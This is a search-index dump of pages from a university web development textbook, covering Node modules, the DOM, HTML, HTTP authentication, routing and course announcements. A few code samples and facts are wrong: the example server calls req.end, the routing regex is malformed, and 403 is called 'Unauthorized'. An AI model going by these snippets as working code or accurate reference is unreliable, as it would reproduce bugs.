require('./database'). This is an application of the Singleton Pattern in a form unique to Node.\nRefactoring for Better Error Prevention While this module can work well, it does suffer from a number of limitations. Perhaps the most important to recognize is that the get() method returns a reference to our aforementioned data variable - so if you change the value of the variable, you change it for all future get() function calls, while sidestepping the persistent file write embodied in our set(). Instead of providing a reference, we could instead provide a copy. A simple trick to do so in JavaScript is to serialize and then deserialize the object (turning it into a JSON string and then back into an object). The refactored get() would then look like:\n/** @function get() * Returns A COPY OF the database object * @returns {object} data - A COPY OF the data object */ function get() { return JSON.parse(JSON.stringify(data)); } Note that there is a possibility this process can fail, so it really should be wrapped in a try/catch and refactored to use a callback to pass on this possible error and the data object:\n/** @function get() * Provides a copy of the data object * @param {function} callback - Provides as the first parameter any errors, * and as the second a copy of the data object. */ function get(callback) { try { var dataCopy = JSON.parse(JSON.stringify(data)); callback(null, dataCopy); } catch (err) { callback(err); } } Notice that with this refactoring, we are using the same pattern common to the Node modules we\u0026rsquo;ve been working with. There is a second benefit here is that if we needed to convert our get() from a synchronous to asynchronous implementation, our function definition won\u0026rsquo;t change (the set() is already asynchronous, as we use the asynchronous fs.writeFile()).\nOther Limitations This database implementation is still pretty basic - we retrieve an entire object rather than just the portion of the database we need, and we write the entire database on every change as well. If our database gets to be very large, this will become an expensive operation.\nThere is also a lot of missed opportunity for optimizing how we get the specific data we need. As you have learned in your algorithms and data structures course, the right search algorithm, coupled with the right data structure, can vastly improve how quickly your program can run. If we think about the work that a webserver does, the retrieval of data for building dynamic HTML based on it is easily one of the most time-consuming aspects, so optimizing here can make each page creation move much faster. Faster page creation means shorter response times, and more users served per minute with less processing power. That, in turn means less electricity, less bandwidth, and less hardware is required to run your website. In heavily utilized websites, this can equate to a lot of savings! And for websites hosted on elastic hosting services (those that only charge for the resources you use), it can also result in significant savings.\nThus, we might want to spend more time developing a robust database program that would offer these kinds of optimizations. Or, we could do what most full-stack developers do, and use an already existing database program that was designed with these kinds of optimizations in mind. We\u0026rsquo;ll take a look at that approach next.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/01-the-dom/02-document-object-model/",
	"title": "Document Object Model",
	"tags": [],
	"description": "",
	"content": "The Document Object Model (or DOM) is a data structure representing the content of a web page, created by the browser as it parses the website. The browser then makes this data structure accessible to scripts running on the page. The DOM is essentially a tree composed of objects representing the HTML elements and text on the page.\nConsider this HTML:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Hello DOM!\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;site.css\u0026#34;/\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;banner\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Hello DOM!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt; The Document Object Model (DOM) is a programming API for HTML and XML documents. It defines the logical structure of documents and the way a document is accessed and manipulated. In the DOM specification, the term \u0026#34;document\u0026#34; is used in the broad sense - increasingly, XML is being used as a way of representing many different kinds of information that may be stored in diverse systems, and much of this would traditionally be seen as data rather than as documents. Nevertheless, XML presents this data as documents, and the DOM may be used to manage this data. \u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;https://www.w3.org/TR/WD-DOM/introduction.html\u0026#34;\u0026gt;From w3.org\u0026#39;s What is the Document Object Model?\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;html\u0026gt; When it is parsed by the browser, it is transformed into this tree:\nThe DOM Tree and Developer Tools Most browsers also expose the DOM tree through their developer tools. Try opening the example page in Chrome or your favorite browser using this link.\nNow open the developer tools for your browser:\nChrome CTRL + SHIFT + i or right-click and select \u0026lsquo;Inspect\u0026rsquo; from the context menu. Edge CTRL + SHIFT + i or right-click and select \u0026lsquo;Inspect element\u0026rsquo; from the context menu. Firefox CTRL + SHIFT + i or right-click and select \u0026lsquo;Inspect Element\u0026rsquo; from the context menu. Safari Developer tools must be enabled. See the Safari User Guide You should see a new panel open in your browser, and under its \u0026rsquo;elements\u0026rsquo; tab the DOM tree is displayed:\nCollapsed nodes can be expanded by clicking on the arrow next to them. Try moving your mouse around the nodes in the DOM tree, and you\u0026rsquo;ll see the corresponding element highlighted in the page. You can also dynamically edit the DOM tree from the elements tab by right-clicking on a node.\nTry right-clicking on the \u0026lt;h1\u0026gt; node and selecting \u0026rsquo;edit text\u0026rsquo;. Change the text to \u0026ldquo;Hello Browser DOM\u0026rdquo;. See how it changes the page?\nThe page is rendered from the DOM, so editing the DOM changes how the page appears. However, the initial structure of the DOM is derived from the loaded HTML. This means if we refresh the page, any changes we made to the DOM using the developer tools will be lost, and the page will return to its original state. Give it a try - hit the refresh button.\nNote\nFor convenience, this textbook will use the Chrome browser for all developer tool reference images and discussions, but the other browsers offer much of the same functionality. If you prefer to use a different browser\u0026rsquo;s web tools, look up the details in that browser\u0026rsquo;s documentation.\nYou\u0026rsquo;ve now seen how the browser creates the DOM tree by parsing the HTML document and that DOM tree is used to render the page. Next, we\u0026rsquo;ll look at how styles interact with the DOM to modify how it is displayed.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/04-node/02-event-loop/",
	"title": "Event Loop &amp; Console",
	"tags": [],
	"description": "",
	"content": "Node adopts an asynchronous event-driven approach to computing, much like JavaScript does in the browser. For example, when we set up a HTTP server in Node, we define a function to call when a HTTP request (an event) is received. As requests come in, they are added to a queue which is processed in a FIFO (first-in, first-out) manner.\nIn addition to events, Node implements many asynchronous functions for potentially blocking operations. For example, consider file I/O. If you write a program that needs to read a file, but when it attempts to do so the file is already open in another program, your program must wait for it to become available. In the meantime, your program is blocked, and its execution pauses. A real-world analogue would be a checkout line at a store. If the cashier is ringing up a customer and finds an item without a price tag, they may leave their station to go find the item on the shelves. While they are away, the line is blocked, everyone in line must wait for the cashier to return.\nThere are two basic strategies to deal with potentially blocking operations - multi-threading and asynchronous processing. A multi-threading strategy involves parallelizing the task; in our store example, we\u0026rsquo;d have additional cash registers, cashiers, and lines. Even if one line is blocked, the others continue to ring up customers. In contrast, asynchronous processing moves the potentially blocking task into another process, and continues with the task at hand. When the asynchronous process finishes, it queues its results for the main process to resume. In our store example, this would be the cashier sending another employee to find the price, suspending the sale on the register, and continuing to check out other customers while the first customer waits. When the other employee returns with a price, the cashier finishes checking out the current customer, then resumes the first customer\u0026rsquo;s transactions.\nNode uses this asynchronous model to handle most potentially blocking operations (and often provides a synchronous approach as well). When possible, the asynchronous process is handled by the operating system, but the Node runtime also maintains a pool of threads to farm tasks out to.\nThe Node event loop is divided into a series of phases - each queues the associated kinds of events and processes them in a round-robin fashion. This helps ensure that one kind of event can\u0026rsquo;t overwhelm the system:\nFor a more detailed breakdown of the Node event loop, check out this blog post by Daniel Khan or the Node Event Loop Documentation.\nConsole To produce output on the terminal, Node provides a global instance of a Console called console that is accessible throughout the code. The typical way to produce text output on the terminal in Node is using the console.log() method.\nNode actually defines multiple log functions corresponding to different log levels, indicating the importance of the message. These are (in order of severity, least to most):\nconsole.debug() console.info() console.warn() console.error() These are all aliases for console.log() (console.debug() and console.info()) or console.error() (console.warn() and console.error()). They don\u0026rsquo;t really do anything different, which might lead you to wonder why they exist\u0026hellip;\nBut remember, JavaScript is a dynamic language, so we can re-define the console object with our own custom implementation that does do something unique with these various versions. But because they exist, they can also be used with the built-in console. This way our code can be compatible with both approaches!\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/a-html/02-html-element-structure/",
	"title": "HTML Element Structure",
	"tags": [],
	"description": "",
	"content": "HTML was built from the SGML (Structured Generalized Markup Language) standard, which provides the concept of \u0026ldquo;tags\u0026rdquo; to provide markup and structure within a text document. Each element in HTML is defined by a unique opening and closing tag, which in turn are surrounded by angle brackets (\u0026lt;\u0026gt;).\nFor example, a top-level heading in HTML would be written:\n\u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt;\nAnd render:\nHello World The \u0026lt;h1\u0026gt; is the opening tag and the \u0026lt;/h1\u0026gt; is the closing tag. The name of the tag appears immediately within the \u0026lt;\u0026gt; of the opening tag, and within the closing tag proceeded by a forward slash (/). Between the opening tag and closing tag is the content of the element. This can be text (as in the case above) or it can be another HTML element.\nFor example:\n\u0026lt;h1\u0026gt;Hello \u0026lt;i\u0026gt;World\u0026lt;/i\u0026gt;!\u0026lt;/h1\u0026gt;\nRenders:\nHello World Nesting Elements An element nested inside another element in this way is called a child of the element it is nested in. The containing element is a parent. If more than one tag is contained within the parent, the children are referred to as siblings of one another. Finally, a element nested several layers deep inside another element is called a descendant of that element, and that element is called an ancestor.\nMatching Tags Every opening tag must have a matching closing tag. Moreover, nested tags must be matched in order, much like when you use parenthesis and curly braces in programming. While whitespace is ignored by HTML interpreters, best developer practices use indentation to indicate nesting, i.e.:\n\u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;Hello World!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt; This is a paragraph, followed by an unordered list... \u0026lt;/p\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;List item #1\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;List item #2\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;List item #3\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; Getting tags out of order results in invalid HTML, which may be rendered unpredictably in different browsers.\nVoid Elements Also, some elements are not allowed to contain content, and should not be written with an end tag, like the break character:\n\u0026lt;br\u0026gt;\nHowever, there is a more strict version of HTML called XHTML which is based on XML (another SGML extension). In XHTML void tags are self-closing, and must include a / before the last \u0026gt;, i.e.:\n\u0026lt;br/\u0026gt;\nIn practice, most browsers will interpret \u0026lt;br\u0026gt; and \u0026lt;br/\u0026gt; interchangeably, and you will see many websites and even textbooks use one or the other strategy (sometimes both on the same page). But as a computer scientist, you should strive to use the appropriate form based type of document you are creating.\nTag Name Case Similarly, by the standards, HTML is case-insensitive when evaluating tag names, but the W3C recommends using lowercase characters. In XHTML tag names must be in lowercase, and React\u0026rsquo;s JSX format uses lowercase to distinguish between HTML elements and React components. Thus, it makes sense to always use lowercase tag names.\nInfo\nXHTML is intended to allow HTML to be interpreted by XML parsers, hence the more strict formatting. While it is nearly identical to HTML, there are important structural differences that need to be followed for it to be valid. And since the point of XHTML is to make it more easily parsed by machines, these must be followed to meet that goal. Like HTML, the XHTML standard is maintained by W3C: https://www.w3.org/TR/xhtml11/.\nAttributes In addition to the tag name, tags can have attributes embedded within them. These are key-value pairs that can modify the corresponding HTML element in some way. For example, an image tag must have a src (source) attribute that provides a URL where the image data to display can be found:\n\u0026lt;img src=\u0026quot;img/Light_Bulb_or_Idea_Flat_Icon_Vector.svg\u0026quot; alt=\u0026quot;Light Bulb\u0026quot;\u0026gt;\nThis allows the image to be downloaded and displayed within the browser:\nNote that the \u0026lt;img\u0026gt; element is another void tag. Also, \u0026lt;img\u0026gt; elements should always have an alt attribute set - this is text that is displayed if the image cannot be downloaded, and is also read by a screen reader when viewed by the visually impaired.\nAttributes come in the form of key-value pairs, with the key and value separated by an equal sign (=) and the individual attributes and the tag name separated by whitespace. Attributes can only appear in an opening or void tag. Some attributes (like readonly) do not need a value.\nThere should be no spaces between the attribute key, the equal sign (=), and the attribute value. Attribute values should be quoted using single or double quotes if they contain a space character, single quote, or double quote character.\nAdditionally, while there are specific attributes defined within the HTML standard that browsers know how to interpret, specific technologies like Angular and React add their own, custom attributes. Any attribute a browser does not know is simply ignored by the browser.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/09-auth/02-http-auth/",
	"title": "HTTP Authentication",
	"tags": [],
	"description": "",
	"content": "The recognition of a need for authentication is not new to the web - it\u0026rsquo;s been there since the earliest standards. In fact, the original URL specification included an optional username and password as part of its format (specified as [username]:[password]@ between the protocol and host). I.e. to make a HTTP authenticated request against the CS departmental server you might use:\nhttps://willie:purpleandwhite@cs.ksu.edu/ However, the use of authentication URLS is now highly discouraged and has been stripped from most browsers, as it is considered a security risk. Instead, if you are using HTTP-based authentication the server needs to issue a challenge 401 Unauthorized response, along with a WWW-Authenticate header specifying the challenge. This will prompt the browser to display a username/password form and will re-submit the request with the credentials using an Authorization header. The process looks something like this:\nAs you can see, when the client makes a request that requires authentication, the server issues a 401 Unauthorized status code, along with an WWW-Authenticate header specifying the authentication scheme. This prompts the browser to request the user credentials via a dialog (much like the one created by the JavaScript functions alert(), confirm(), and prompt()). If the user supplies credentials, the request is re-sent, with those credentials included in an Authentication header. The server then decides, based on the credentials, if it will allow the request (typically a 200 response), or refuse (a 403 Unauthorized response).\nThe WWW-Authenticate header looks like:\nWWW-Authenticate: [type] realm=[realm] Where [type] is the authentication scheme (Basic being the most common), and realm describing the protected part of the server.\nIn the Basic authentication scheme, the content of the Authorization header is the string [username]:[password] encoded in base64, where [username] is the users\u0026rsquo; username, and [password] is their password.\nWarning\nBase64 encoding is easy to undo, so you should only use HTTP Basic Authentication with the https protocol, which encrypts the request headers. Otherwise, anyone along the path the user\u0026rsquo;s request travels can capture and decrypt the user\u0026rsquo;s credentials.\nThe standard also defines other authorization schemes, but none are widely used today. Instead, most web developers have opted to build authentication directly into their web application. We\u0026rsquo;ll discuss several of the most common approaches next.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/05-web-servers/02-http-in-node/",
	"title": "HTTP in Node",
	"tags": [],
	"description": "",
	"content": "Node was written primarily to provide tools to develop web servers. So it should come as no surprise that it supports HTTP through a built-in library, the http module. This module provides support for creating both web servers and web clients, as well as working with http requests and responses. Let\u0026rsquo;s start by examining the latter.\nNode HTTP Request Remember that a HTTP request is nothing more than a stream of text formatted according to the HTTP standards, as we discussed in Chapter 2. Node makes this information easier to work with in your server code by parsing it into an object, an instance of http.IncomingMessage. Its properties expose the data of the request, and include:\nmessage.headers - the request headers as a JavaScript object, with the keys corresponding to the HTTP header key, and the values corresponding to the HTTP header values. message.method - request method, i.e. 'GET', 'POST', 'PUT', 'PATCH', or 'DELETE' message.url - the URL string provided through the request. Note that this URL does not contain the protocol and host information (those were set during the connection opening process) You typically won\u0026rsquo;t create an http.IncomingMessage, rather it will be provided to you by an instance of http.Server, which we\u0026rsquo;ll talk about shortly.\nNode HTTP Response The HTTP response is also nothing more than a stream of text formatted according to the HTTP standards, as laid out in Chapter 2. Node also wraps the response with an object, an instance of http.ServerResponse. However, this object is used to build the response (which is the primary job of a web server). This process proceeds in several steps:\nSetting the status code \u0026amp; message Setting the headers Setting the body Setting the trailers Sending the response Not all of these steps are required for all responses, with the exception of the sending of the response. We\u0026rsquo;ll discuss the process of generating a response in more detail later. As with the http.IncomingMessage, you won\u0026rsquo;t directly create http.ServerResponse objects, instead they will be created by an instance of http.Server, which we\u0026rsquo;ll look at next.\nNode HTTP Server The http.Server class embodies the basic operating core of a webserver, which you can build upon to create your own web server implementations. Instances of http.Server are created with the factory method http.createServer(). This method takes two parameters, the first is an optional JavaScript object with options for the server, and the second (or first, if the options parameter is omitted) is a callback function to invoke every time the server receives a request. As you might expect, the method returns the created http.Server instance.\nThe callback function always takes two parameters. The first is an instance of http.IncomingMessage (often assigned to a variable named req) that represents the request the server has received, and the second is an instance of http.ServerResponse (often assigned to available named res) that represents the response the server will send back to the client, once you have set all its properties. This callback is often called the request handler, for it decides what to do with incoming requests. Each incoming request is handled asynchronously, much like any event.\nOnce the server has been created, it needs to be told to listen for incoming requests. It will do so on a specific port. This port is represented by a number between 0 and 65535. You can think of your computer as an apartment complex, and each port number corresponding to an apartment number where a specific program \u0026ldquo;lives\u0026rdquo;. Thus, to send a message to that particular program, you would address your letter to the apartment address using the apartment number. In this analogy, the apartment address is the host address, i.e. the IP address of your computer, and the specific apartment is the port. Certain port numbers are commonly used by specific applications or families of applications, i.e. web servers typically use port 80 for HTTP and port 443 for HTTPS connections. However, when you are developing a webserver, you\u0026rsquo;ll typically use a non-standard port, often an address 3000 and up.\nThus, to start your webserver running on port 3000, you would invoke [server.Listen()] with that port as the first argument. An optional second argument is a callback function invoked once the server is up and running - it is usually used to log a message saying the server is running.\nAn Example Server A quick example of a server that only responds with the message \u0026ldquo;Hello web!\u0026rdquo; would be:\nconst http = require(\u0026#39;http\u0026#39;); const server = http.createServer((req, res) =\u0026gt; { req.end(\u0026#34;Hello web!\u0026#34;); }); server.listen(3000, () =\u0026gt; { console.log(\u0026#34;Server listening at port 3000\u0026#34;); }); Once the server is running, you can visit http://localhost:3000 on the same computer to see the phrase \u0026ldquo;Hello web!\u0026rdquo; printed in your browser.\nThe localhost hostname is a special loopback host, which indicates instead of looking for a computer on the web, you\u0026rsquo;re wanting to access the computer you\u0026rsquo;re currently on. The :3000 specifies the browser should make the request to the non-standard port of 3000. If we instead used port 80, we could omit the port in the URL, as by default the browser will use port 80 for http requests.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/02-navigating-canvas/",
	"title": "Navigating Canvas",
	"tags": [],
	"description": "",
	"content": " Web Only\nThis textbook was authored for the CIS 526 - Web Application Development course at Kansas State University. This front matter is specific to that course. If you are not enrolled in the course, please disregard this section.\nThis course makes extensive use of several features of Canvas which you may or may not have worked with before. To give you the best experience in this course, this page will briefly describe those features and the best way to access them.\nWhen you first access the course on Canvas, you will be shown this homepage, with my contact information and any important information about the course. This is a quick, easy reference for you if you ever need to get in touch with me.\nLet’s walk through the options in the main menu to the left. First, any course announcements will be posted in the Announcements section, which is available here. Those announcements will also be configured to send emails to all students when they are posted, though in your personal Canvas settings you can disable email notifications if you so choose. Please make sure you check here often for any updates to course information.\nThe next section is Modules, which is where you’ll primarily interact with the course. You’ll notice that I’ve disabled several of the common menu items in this course, such as Files and Assignments. This is to simplify things for you as students, so you remember that all the course content is available in one place.\nWhen you first arrive at the Modules section, you’ll see all of the content in the course laid out in order. If you like, you can minimize the modules you aren’t working on by clicking the arrow to the left of the module name.\nAs you look at each module, you’ll see that it gives quite a bit of information about the course. At the top of each module is an item telling you what parts of the module you must complete to continue. In this case, it says “Complete All Items.” Likewise, the following modules may list a prerequisite module, which you must complete before you can access it.\nWithin each module is a set of items, which must be completed in listed order. Under each item you’ll see information about what you must do in order to complete that item. For many of them, it will simply say “view,” which means you must view the item at least once to continue. Others may say “contribute,” “submit,” or give a minimum score required to continue. For assignments, it also helpfully gives the number of points available, and the due date.\nLet’s click on the first item, Course Introduction, to get started. You’ve already been to this page by this point. Course pages will primarily consist of readings covering the content of the course. Some may also include an embedded video; in this case the video will be followed by slides and a downloadable version of the video, and a rough script for quick reference - as is the case for this page.\nWhen you are ready to move to the next step in a module, click the “Next” button at the bottom of the page. Canvas will automatically add “Next” and “Previous” buttons to each piece of content which is accessed through the Modules section, which makes it very easy to work through the course content. I’ll click through a couple of items here.\nAt any point, you may click on the Modules link in the menu to the left to return to the Modules section of the site. You’ll notice that I’ve viewed the first few items in the first module, so I can access more items here. This is handy if you want to go back and review the content you’ve already seen, or if you leave and want to resume where you left off. Canvas will put green checkmarks to the right of items you’ve completed.\nFinally, you’ll find the usual Canvas links to view your Grades in the course, as well as People listing instructors, TAs, and fellow students taking the course.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/08-routing/02-routing/",
	"title": "Request Routing",
	"tags": [],
	"description": "",
	"content": "In web development, routing refers to the process of matching an incoming request with generating the appropriate response. For most web servers (and definitely for Node-based ones), we abstract the process of generating the response into a function. We often call these functions endpoints as their purpose is to serve the response, effectively ending the processing of an incoming request with an appropriate response.\nWith a Node webserver, endpoint functions typically take in a req (an instance of http.IncomingMessage) and res (an instance of http.ServerResponse) objects. These objects form an abstraction around the HTTP request and response.\nRouting in a Node webserver therefore consists of examining the properties of the req object and determining which endpoint function to invoke. Up to this point, we\u0026rsquo;ve done this logic in a handleRequest() function, in a fairly ad-hoc way. Consider what we might need to do for a dynamically generated blog - we\u0026rsquo;d need to serve static files (like CSS and JS files), as well as dynamically generated pages for blog posts and the home page. What might our handleRequest() look like in that case?\nLet\u0026rsquo;s assume we have a serveHome() function to serve the home page, a serveFile() function to serve static files, and a servePost() function to serve dynamically generated posts. Determining if the request is for the homepage is easy, as we know the path should just be a forward slash:\n// Determine if the request is for the index page if(req.url === \u0026#39;/\u0026#39;) return serveHome(req, res); But what about determining if a request is for a post or a static file? We could use fs.stat to determine if a file exists:\n// Determine if a corresponding file exists fs.stat(path.join(\u0026#34;public\u0026#34;, req.url), (err, stat) =\u0026gt; { if(err) { // Error reading file, might be a post? servePost(req, res); } else { // File exists, serve it serveFile(req, res); } }); This would work, but it\u0026rsquo;s a bit ugly. Also, using a filesystem method like fs.stat is potential bottleneck in our application; we\u0026rsquo;d like to avoid it if at all possible.\nIf we make all our posts use the url /posts, we could use the query string to determine which post we want to display. This approach is a bit cleaner, though it does mean we need to separate the pathname from our URL:\npublic handleRequest(req, res) { // Separate the pathname from the url const pathname = new URL(req.url, \u0026#34;http://localhost\u0026#34;).pathname; // Determine if the request is for the index page if(pathname === \u0026#39;/\u0026#39;) return serveHome(req, res); // Determine if the request is for a post if(pathname === \u0026#39;/post\u0026#39;) return servePost(req, res); // Treat all other requests as a file serveFile(req, res); } This is a bit cleaner of an approach, but it still has a very ad-hoc feel and requires us to incorporate query strings into some of our URLs.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/08-routing/03-resources/",
	"title": "Resources",
	"tags": [],
	"description": "",
	"content": "As the web transitioned to dynamic pages, the concept of the URL path evolved. With a static server, the path indicates an actual file that exists on the fileserver. But with dynamic pages, the url doesn\u0026rsquo;t have to correspond to anything real. Consider the case of Placeholder.com, a service that offers image URLs you can use in a site layout to simulate images. For example, the image below is generated by the site by using the URL By using the URL //via.placeholder.com/350x150:\nDoes Placeholder.com have thousands of images of varying sizes stored on a disk somewhere? No! It generates the image data dynamically based on the request - here it reads the 350x150 and uses it to determine the size of the image needed. It also reads other aspects of the URL and uses those to set other aspects, i.e. the url //via.placeholder.com/350x150/C497FF/FFFFFF?text=Hello generates the image:\nClearly, we\u0026rsquo;re conveying information to the Placeholder.com server through the url. This is much like passing parameters to a function - it is how we communicate what we want the server to do with our request!\nLet\u0026rsquo;s revisit our blog server. What if we adopted a similar approach there? Our URLs might then look like:\nhttp://my-blog.com/posts/0-hello-web http://my-blog.com/posts/1-a-rose-by-any-other-name http://my-blog.com/posts/40-another-day Where we use the entire title as part of the URL! This makes it more human-readable, especially helpful when searching your browser history or scanning bookmarks. But how would we handle this approach in our handleRequest()? You might recognize that we have a reoccurring pattern, which of course suggests we try a RegExp:\npublic handleRequest(req, res) { // Separate the pathname from the url const pathname = new URL(req.url, \u0026#34;http://localhost\u0026#34;).pathname; // Determine if the request is for the index page if(pathname === \u0026#39;/\u0026#39;) return serveHome(req, res); // Determine if the request is for a post if(\\$/post/\\w+^\\g.test(pathname)) return servePost(req, res); // Treat all other requests as a file serveFile(req, res); } With this regular expression, we\u0026rsquo;ve effectively built a wildcard into our URL. Any URL with a pattern /posts/[postname] will be treated as a post!\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/10-dynamic-web-frameworks/02-web-frameworks/",
	"title": "Web Frameworks",
	"tags": [],
	"description": "",
	"content": "Web frameworks were designed meet these challenges, and to help programmers develop web applications more quickly and with less errors. They do so through providing a standardized approach to building a web application, including imposing a software architecture, providing commonly-needed functionality, libraries for database communication, and generators to create boilerplate code. These frameworks built upon existing Web Stacks, allowing the programmer to focus almost exclusively on the scripting aspect.\nA slew of frameworks for various scripting languages emerged in 2005:\nSymfony using PHP Django using Python Ruby on Rails using Ruby Grails using Groovy (a Java Virtual Machine Language) And new ones continue to emerge relatively often:\nExpress using [JavaScript (via Node)] in 2010 Laravel using PHP in 2011 Phoenix using Elixir in 2014 ASP.NET MVC using .NET languages 2015 These represent only some of the best known server-side frameworks. A newer trend are client-side frameworks, which are built on JavaScript (or one of its derivatives) and run in the browser communicating with a web API. Some of the best known of these include:\nEmber using JavaScript in 2011 Meteor using JavaScript in 2012 React using JavaScript or JSX in 2013 Vue.js using JavaScript in 2014 Angular using TypeScript in 2016 Next.JS using JavaScript or JSX in 2016 You can see there is a large variety represented and available to us - and these are only some of the best known!\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/",
	"title": "Hyper-Text Transfer Protocol",
	"tags": [],
	"description": "",
	"content": "Chapter 2 Hyper-Text Transfer Protocol Etiquette for Web Servers and Clients\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/old/summer2021/07-sessions/",
	"title": "Sessions",
	"tags": [],
	"description": "",
	"content": " "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/week04/",
	"title": "Summer &#39;22 Week 4",
	"tags": [],
	"description": "",
	"content": " Resources Slides Video Script Hello, and welcome to the week for announcements video for CIS 526 and CC 515 in summer 2022. This week you should be wrapping up milestone three, which is due tonight. So make sure you get that submitted online. And then this coming week, you\u0026rsquo;ll be working on the week four lessons. There is no milestone due this coming week, because partially we have the Fourth of July holiday on Monday. And also partially because we\u0026rsquo;ve got a lot of content to cover. So you really have two weeks of content before the next milestone, and we\u0026rsquo;ll talk about that in just a second.\nSo first off, I will be working on milestone three grading this week. So make sure you keep an eye out for that. Look for code comments from me in GitHub for any usual things about code that you can improve. I\u0026rsquo;ll also leave comments on the actual assignment details themselves in Codio that should also feed over to Canvas. If you have anything in particular you want to ask me about, you can use submission comments, or put it in your release notes on GitHub. Either one of those is helpful so that I know what I\u0026rsquo;m looking for. As always, please be patient with the grading all of this grading is done manually. And especially this week. And going forward. As the milestones get larger, it will take me more and more time to grade each individual one, I do try and take some time and read through a lot of your code. So it may take me a couple of days to get through all the grading. So please be patient and I will get back to you as soon as I can.\nSo coming up this week, you\u0026rsquo;ll start to work with dynamic web servers. So you\u0026rsquo;ll be doing things such as working with server pages written in ECMAScript, you\u0026rsquo;ll be looking at file uploads and sessions. And then eventually leading into week five, we\u0026rsquo;ll start doing a tutorial on working with a block. And so that blog tutorial is really the core pieces of what you\u0026rsquo;re going to need to work on the next milestone, which is milestone four, milestone four, we\u0026rsquo;re going to take your app and refactor it once again, this time, you\u0026rsquo;ll be building it as an express.js app. So you\u0026rsquo;ll need to add routing through Express, you\u0026rsquo;ll be adding things such as the static middleware, you\u0026rsquo;ll be adding API endpoints to actually read the box locations from a database this time. And so you\u0026rsquo;ll also actually be making some changes to the database, you\u0026rsquo;ll be working with dynamic pages that you\u0026rsquo;re actually going to submit using templates. And you\u0026rsquo;re going to have a form and submit data from a form that gets put into the database. So this is really taking your app to the next level. It is a two week milestone, which means you have two weeks to work on it, I highly encourage you to try and get through all of the tutorials pretty quick this week and early next week. So you\u0026rsquo;ve got plenty of time to work on this milestone, this milestone four is significantly more complicated than milestones three and earlier. So make sure you allow plenty of time to work on milestone four. As always, if you have any questions with this, let me know I understand for some of you, especially in CC 515, you may not have a ton of database experience at this point. So if you do get stuck on the database, let me know. And I can give you some quick hints of how you can do a little bit of the SQL that you maybe haven\u0026rsquo;t seen before. For those of you in CIS 526. Hopefully you\u0026rsquo;ve already taken 560 or in 560. And so you have seen some of that content already. But I do recognize the databases are a little bit outside of scope for this class. So if you need a little bit of help getting the SQL lite database to work, let me know.\nSo other than that I\u0026rsquo;m always available for help. We\u0026rsquo;ve got discussions on Discord that we can always chat. I have tea time office hours every Tuesday 330 And Fridays at 1030. If you want to come hang out while you work. You can also do one on one office hours by scheduling time with me on Calendly. You can send me an email, I\u0026rsquo;m happy to answer questions as much as I can. But basically keep in mind you got two weeks to work on two weeks worth of content, but you have a doubly-sized milestone that is really big and difficult. So make sure you give yourself plenty of time to work on milestone four. So we\u0026rsquo;re really switching over to start working with data and using some data driven website techniques. So you\u0026rsquo;ll have a database that you\u0026rsquo;re working with, you\u0026rsquo;re actually going to build a responsive API that builds on the RESTful API standard. So we\u0026rsquo;re really moving into more data driven websites. I hope this next milestone really helps open your eyes to how full stack web development really works. But as always, if you have any questions, let me know. I wish you the best of luck and I will see you again next Tuesday.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/week05/",
	"title": "Summer &#39;22 Week 5",
	"tags": [],
	"description": "",
	"content": " Resources Slides Video Script Hello, and welcome to the week five announcements video for CIS 526 and CC 515, in summer 2022. So this week, you should be working on week five, which is the second of a two week series that leads up toward milestone four, where we really shift our focus from static websites and a little bit of Ajax in the browser to full on dynamic websites using Express and all sorts of things around that. So it\u0026rsquo;s a big shift, it\u0026rsquo;s a two week milestone. So make sure you give yourself plenty of time to get working on this milestone. A big hint for me is if you start milestone four on Monday, you\u0026rsquo;re probably not going to get it done and turn it in yet that day, it is quite a bigger project than the last few milestones.\nSo this week, you\u0026rsquo;re going to start learning a little bit more about full stack web development, we\u0026rsquo;re going to cover template rendering, which is all about taking the ECMAScript templates that you learned last week. And expanding on that a bit. We\u0026rsquo;re going to talk about data serialization and databases, how we can actually store data that is submitted to the website and then pull that back out and use that to render our pages, we\u0026rsquo;re going to look at routing, how we can take the URL and use it to determine what functions or what templates to actually render. And then you\u0026rsquo;re going to start working on the blog tutorial. And so this week next week, there are a series of tutorials where you will build an interactive blog. And it\u0026rsquo;s really sets the stage for all of the full stack web development stuff that we\u0026rsquo;re going to do in this course. So the blog tutorial really gives you a lot of the code that you\u0026rsquo;re going to want to pull into the milestone as you work on the next milestone.\nSo again, for milestone four, we\u0026rsquo;re going to be pivoting our project into an Express app, we\u0026rsquo;re going to be adding things like routing and the static middleware to handle some of those features, you\u0026rsquo;re going to have various API endpoints for getting the boxes and getting information about the boxes, you\u0026rsquo;ll have an SQL lite database that stores all the information from now on. And then you\u0026rsquo;re going to build some dynamic pages that are actually rendered on the server and then presented to 